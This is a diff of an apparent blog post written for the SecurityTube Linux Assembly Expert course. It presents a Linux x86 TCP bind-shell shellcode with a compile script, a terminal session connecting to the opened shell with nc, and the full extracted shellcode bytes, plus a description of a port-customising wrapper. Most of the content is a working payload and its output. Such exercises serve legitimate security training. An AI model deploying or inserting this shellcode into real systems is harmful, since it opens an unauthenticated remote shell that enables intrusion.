@@ -304,7 +304,6 @@ Shellcode for TCP Bind Shell witha cutom wrapper script for dynamic port choosin
 
 A simple compile script is used to compile and link .asm file , once successfull ,we can execute it and connect to it
 
-
 toor@ubuntu:~/Desktop/slae/Assignments/1$ cat compile.sh
 
 #!/bin/bash
@@ -317,57 +316,42 @@ ld -o $1 $1.o
 
 echo 'Go Ahead, may the force be with you'
 
-
 toor@ubuntu:~/Desktop/slae/Assignments/1$ ./compile.sh bind
-
 Assembling with nasm
-
 Success, Now Linking
-
 Go Ahead, may the force be with you
-
 toor@ubuntu:~/Desktop/slae/Assignments/1$ ./bind
 
 
 toor@ubuntu:~/Desktop/slae/Assignments/1$ nc -v 127.0.0.1 4444
-
 Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
-
 id
-
 uid=1000(toor) gid=1000(toor) groups=1000(toor),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
-
 echo $SHELL
-
 /bin/bash
 
 **SHELLCODE**
 
+
 Using objdump to extract shellcode
 
 toor@ubuntu:~/Desktop/slae/Assignments/1$ objdump -d ./bind|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr 
-
 '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-
 "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x50\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xb3\x01\xcd\x80\x89\xc7\x52\x52\x66\x68\x1
-
 1\x5c\x66\x6a\x02\x89\xe6\x6a\x10\x56\x57\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x31\xf6\x56\x57\x89\xe1\xb0\x66\xb3\x04\xcd\x80\x31\xf6\x56\x5
-
 6\x57\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x62\x61\x7
-
 3\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"
-
 toor@ubuntu:~/Desktop/slae/Assignments/1$
 
 
 **Wrapper script to bind custom port**
 
 since port 4444 is harcoded in the script we have to create a custom shellcode with customisable portnumber.
-
 Script logic is user port number input is converted to network byte order and swapped with 4444 representation.
 
 
 **Github Repo**
+
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
 
 Student ID: SLAE-1509
